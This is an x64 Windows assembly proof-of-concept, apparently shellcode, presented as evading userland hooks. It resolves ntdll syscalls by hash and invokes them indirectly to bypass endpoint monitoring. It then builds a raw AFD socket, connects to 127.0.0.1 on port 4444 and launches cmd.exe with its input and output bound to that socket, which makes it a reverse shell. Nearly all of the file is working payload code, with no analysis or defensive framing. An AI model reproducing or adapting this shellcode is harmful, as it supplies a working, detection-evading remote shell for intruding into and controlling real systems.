BITS 64

; This proof-of-concept is designed to execute
; standalone with userland hook evasion.
;
;                .,u%:;-..
;             ,d$$$$7^^?$i;.
;           ,' /^$S'    `?$i:.
;          j ,'  I$,     jb.:i:
;        ,$S$$b,j$S$$bupd$'.:i;.
;        ,//:"?a$$SI$?S$$b,:iIi:.
;          '   '/?$*'   -*?L':i::
;                ^,'.  j?'b,\ .::
;        .,           .7i_,   .:.
;        ip,i/:|,     d?i7'   . 
;       j7j$$Sp,u,+,.p$?'  ,:'
;       $d$$$SSIiS$$7j7?i:
;          '^"="^'^'^"

        CLD
        AND     RSP,    0xFFFFFFFFFFFFFFF0
        MOV     RAX,    0x7369746E656C6973
        PUSH    RAX

GET_NTDLL:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX + 0x10]
        PUSH    RAX
        
        SUB     RSP,    0x60
        MOV     RBP,    RSP

; GET_NTTERMINATEPROCESS:
;         MOV     RCX,    QWORD   [RBP + 0x60]
;         MOV     RDX,    0x618D8E8F
;         CALL    FIND_SYSCALL
;         
;         MOV     DWORD   [RSP + 0x48],   EAX
;         MOV     QWORD   [RSP + 0x40],   RCX

GET_NTTERMINATETHREAD:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0x3ECF2582
        CALL    FIND_SYSCALL

        MOV     DWORD   [RBP + 0x48],   EAX
        MOV     QWORD   [RBP + 0x40],   RCX

GET_NTCREATEFILE:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0x4489294C
        CALL    FIND_SYSCALL

        MOV     DWORD   [RBP + 0x38],   EAX
        MOV     QWORD   [RBP + 0x30],   RCX

GET_NTCREATEUSERPROCESS:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0xC43BACB
        CALL    FIND_SYSCALL

        MOV     DWORD   [RBP + 0x28],   EAX
        MOV     QWORD   [RBP + 0x20],   RCX

GET_NTDEVICEIOCONTROLFILE:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0x7FB40DDF
        CALL    FIND_SYSCALL

        MOV     DWORD   [RBP + 0x18],   EAX
        MOV     QWORD   [RBP + 0x10],   RCX

GET_RTLCREATEUSERPROCESSPARAMS:
        MOV     RCX,    QWORD   [RBP + 0x60]
        MOV     RDX,    0x90E3A882
        CALL    FIND_SYSCALL

        MOV     DWORD   [RBP + 0x08],   EAX
        MOV     QWORD   [RBP + 0x00],   RCX

SYSCALLS:

RUN_NTCREATEFILE:
        CALL    CLEAN
        PUSH    0x00
        MOV     RCX,    RSP
        MOV     RDX,    0xC0100000
        MOV     RAX,    0x0074006e0069006f
        PUSH    RAX
        MOV     RAX,    0x00700064006e0045
        PUSH    RAX
        MOV     RAX,    0x005c006400660041
        PUSH    RAX
        MOV     RAX,    0x005c006500630069
        PUSH    RAX
        MOV     RAX,    0x007600650044005c
        PUSH    RAX
        PUSH    RSP
        PUSH    0x002A0028
        MOV     RAX,    RSP
        PUSH    0x00
        PUSH    0x00
        PUSH    0x42
        PUSH    RAX
        PUSH    0x00
        PUSH    0x30
        MOV     R8,     RSP
        PUSH    0x00
        PUSH    0x00
        MOV     R9,     RSP
        MOV     RAX,    0x00000000FFFFFFFF
        PUSH    RAX
        MOV     RAX,    0xFFFFFFFFFFFFFFFF
        PUSH    RAX
        PUSH    RSP
        PUSH    0x06
        MOV     RAX,    0x0000000100000002
        PUSH    RAX
        PUSH    0x00
        MOV     RAX,    0x00585874656B6361
        PUSH    RAX
        MOV     RAX,    0x506E65704F646641
        PUSH    RAX
        MOV     RAX,    0x001E0F0000000000
        PUSH    RAX
        PUSH    0x38
        LEA     RAX,    [RSP + 0x08]
        PUSH    RAX
        PUSH    0x20
        PUSH    0x03
        PUSH    0x03
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     R10,    [RBP + 0x38]
        MOV     R11,    [RBP + 0x30]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL
        ADD     RSP,    0x118
        CMP     RAX,    0x00
        JNZ     RUN_NTTERMINATEPROCESS

RUN_NTBIND:
        CALL    CLEAN
        MOV     RCX,    [RSP]
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     RAX,    0x200000002
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        PUSH    0x10
        LEA     RAX,    QWORD   [RSP + 0x30]
        PUSH    RAX
        PUSH    0x14
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0x12003
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     R10,    [RBP + 0x18]
        MOV     R11,    [RBP + 0x10]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL
        ADD     RSP,    0x88
        CMP     RAX,    0x00
        JNZ     RUN_NTTERMINATEPROCESS

RUN_NTCONNECT:
        CALL    CLEAN
        MOV     RCX,    [RSP]
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     RAX,    0x0100007F5C110002
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x10
        LEA     RAX,    QWORD   [RSP + 0x40]
        PUSH    RAX
        PUSH    0x28
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX,
        PUSH    0x12007
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     R10,    [RBP + 0x18]
        MOV     R11,    [RBP + 0x10]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL
        ADD     RSP,    0x98
        CMP     RAX,    0x00
        JNZ     RUN_NTTERMINATEPROCESS

RUN_RTLCREATEUSERPROCESSPARAMS:
        CALL    CLEAN
        PUSH    0x00
        MOV     RCX,    RSP        
        MOV     RAX,    0x0000006500780065
        PUSH    RAX
        MOV     RAX,    0x002E0064006D0063
        PUSH    RAX
        MOV     RAX,    0x005C00320033006D
        PUSH    RAX
        MOV     RAX,    0x0065007400730079
        PUSH    RAX
        MOV     RAX,    0x0053005C00730077
        PUSH    RAX
        MOV     RAX,    0x006F0064006E0069
        PUSH    RAX
        MOV     RAX,    0x0057005C003A0043
        PUSH    RAX
        MOV     RAX,    0x005C003F003F005C
        PUSH    RAX
        PUSH    RSP
        PUSH    0x0040003E
        MOV     RDX,    RSP
        PUSH    0x00
        PUSH    0x01
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     R10,    [RBP + 0x08]
        MOV     R11,    [RBP + 0x00]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL
        ADD     RSP,    0xB0

RUN_NTCREATEUSERPROCESS:
        MOV     R11,    [RSP]
        ADD     R11,    0x10
        MOV     RAX,    0xFFFFFFFFFFFFFFFD
        MOV     QWORD   [R11],  RAX
        ADD     R11,    0x10
        MOV     RAX,    QWORD   [RSP + 0x08]
        MOV     QWORD   [R11],  RAX
        ADD     R11,    0x08
        MOV     QWORD   [R11],  RAX
        ADD     R11,    0x08
        MOV     QWORD   [R11],  RAX
        ADD     R11,    0x74
        MOV     RAX,    0x00000100
        MOV     DWORD   [R11],  EAX
        SUB     R11,    0xA4
        SUB     RSP,    0x48
        MOV     RAX,    [RSP]
        PUSH    0x00
        MOV     RCX,    RSP
        PUSH    0x00
        MOV     RDX,    RSP
        PUSH    0x00
        PUSH    RAX
        PUSH    0x3E
        PUSH    0x20005
        PUSH    0x28
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x58
        LEA     RAX,    QWORD   [RSP + 0x50]
        PUSH    RAX
        LEA     RAX,    QWORD   [RSP + 0x08]
        PUSH    RAX
        PUSH    R11
        PUSH    0x00
        PUSH    0x04
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     R8,     0x1F0FFF
        MOV     R9,     0x1F03FF
        MOV     R10,    [RBP + 0x28]
        MOV     R11,    [RBP + 0x20]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL
        ADD     RSP,    0x0130

RUN_NTTERMINATEPROCESS:
        MOV     RCX,    0x00
        XOR     RDX,    RDX
        MOV     R10,    [RBP + 0x48]
        MOV     R11,    [RBP + 0x40]
        CALL    SET_SYSCALL
        CALL    RUN_SYSCALL

FIND_SYSCALL:

PARSE_MODULE:
        MOV     R8D,    DWORD   [RCX + 0x3C]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R8D,    DWORD   [R8 + 0x88]
        LEA     R8,     QWORD   [RCX + R8]
        PUSH    R8
        MOV     R9D,    DWORD   [R8 + 0x18]
        MOV     R10D,   DWORD   [R8 + 0x20]
        LEA     R10,    QWORD   [RCX + R10]

SEARCH:
        DEC     R9,
        MOV     ESI,    DWORD   [R10 + R9 * 0x04]
        LEA     RSI,    QWORD   [RCX + RSI]
        XOR     RAX,    RAX
        XOR     R8,     R8

HASH:
        LODSB
        TEST    AL,     AL
        JZ      COMPARE
        ROR     R8D,    0x07
        ADD     R8D,    EAX
        JMP     HASH

COMPARE:
        CMP     RDX,    R8
        JNZ     SEARCH
        
FIND_STUB:
        POP     R8
        MOV     EAX,    DWORD   [R8 + 0x24]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOVZX   EDX,    WORD    [RAX + R9 * 0x02]
        MOV     EAX,    DWORD   [R8 + 0x1C]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOV     EAX,    DWORD   [RAX + RDX * 0x04]
        LEA     RDX,    QWORD   [RCX + RAX]

FIND_SYSTEM_SERVICE_NUMBER:
        XOR     R8,     R8

NUM_FOR:
        CMP     R8B,    0xFF
        JNZ     SEARCH_NUM
        XOR     RAX,    RAX
        JMP     FIND_SYSCALL_INSTRUCTION

SEARCH_NUM:
        MOV     EAX,    DWORD   [RDX + R8]
        AND     EAX,    0xFF0000FF
        CMP     EAX,    0x000000B8
        JZ      SAVE_NUM
        INC     R8
        JMP     NUM_FOR

SAVE_NUM:
        MOV     EAX,    DWORD   [RDX + R8 + 1]

FIND_SYSCALL_INSTRUCTION:
        XOR     R8,     R8

INSTRUCT_FOR:
        CMP     R8B,    0xFF
        JNZ     SEARCH_INSTRUCT
        MOV     RCX,    RDX
        JMP     ABANDON

SEARCH_INSTRUCT:
        MOV     CX,     WORD    [RDX + R8]
        CMP     CX,     0x050F
        JZ      SAVE_INSTRUCT
        INC     R8
        JMP     INSTRUCT_FOR

SAVE_INSTRUCT:
        LEA     RCX,    QWORD   [RDX + R8]

ABANDON:
        RET

SET_SYSCALL:
        XOR     RAX,    RAX
        MOV     DWORD   [RBP + 0x58],   EAX
        MOV     QWORD   [RBP + 0x50],   RAX
        MOV     DWORD   [RBP + 0x58],   R10D
        MOV     QWORD   [RBP + 0x50],   R11
        RET

RUN_SYSCALL:
        MOV     EAX,    DWORD   [RBP + 0x58]
        MOV     R10,    RCX
        JMP     QWORD   [RBP + 0x50]

CLEAN:
        XOR     RCX,    RCX
        XOR     RDX,    RDX
        XOR     R8,     R8
        XOR     R9,     R9
        XOR     R10,    R10
        RET